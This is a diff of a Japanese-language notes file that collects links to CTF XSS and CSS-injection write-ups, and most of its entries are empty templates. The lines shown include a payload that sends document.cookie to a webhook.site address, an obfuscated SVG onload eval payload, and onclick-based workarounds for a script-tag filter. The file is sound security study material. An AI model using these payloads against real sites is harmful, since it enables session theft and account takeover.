@@ -821,22 +821,41 @@ window.name=”document.location=’https://webhook.site/*hash*?'+document.cooki
 window.location=”http://entropian-01.pwn.beer:3001/entropian?input=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E"
 </script>
 ```
-## 
+## XSS in title form / bypass blacklist \<script> (HackerOne CTF：Micro-CMS v1)
+https://mnorris.io/hackerone%20ctf/h1_Micro-CMS_v1/  
 - **entrypoint**   
-- **概要**   
-- **Payload**   
+`/page/create/2`とかでページをフォームから入力して、「タイトル」、「ページの内容」を送信できるページがある。  
+「ページの内容」フォーム内では`<script>`タグが弾かれているが`<button onclick=alert('XSS')>Some button</button>`,`<img src='whatever' onclick=alert('XSS')>`みたいなそれ以外ではJSが実行できる。  
+また、「タイトル」内では`<script>`がサニタイジングされずにTOPページに埋め込まれるのでXSSができる。  
 
 ## 
 - **entrypoint**   
 - **概要**   
 - **Payload**   
 
-## 
+## CSS Injection / Self Injection / Header Injection / Command Injection (Google CTF Cat Chat)
+https://terjanq.github.io/google-ctf-writeups/   
+- **entrypoint**   
+ムズそう…  
+- **概要**   
+- **Payload**   
+
+## bypass XSS Auditor (ISITDTU CTF 2019 Quals Writeup - XSSgame1)
+https://graneed.hatenablog.com/entry/2019/06/30/224928   
+- **entrypoint**   
+もうXSS Auditorは廃止されてるから…   
+- **概要**   
+- **Payload**   
+
+## CSS Injection (TSG CTF BADNONCE Part 1)
+https://hackmd.io/@sekai/rk-iwwpo4?type=view  
 - **entrypoint**   
 - **概要**   
 - **Payload**   
-## 
+## XSS-unsafe jQuery plugins (GitHub Security Lab CTF 3:)
+https://paraschetal.in/write-up/2020/01/28/github-security-lab-ctf.html   
 - **entrypoint**   
+まだ読んでない。  
 - **概要**   
 - **Payload**   
 ## 
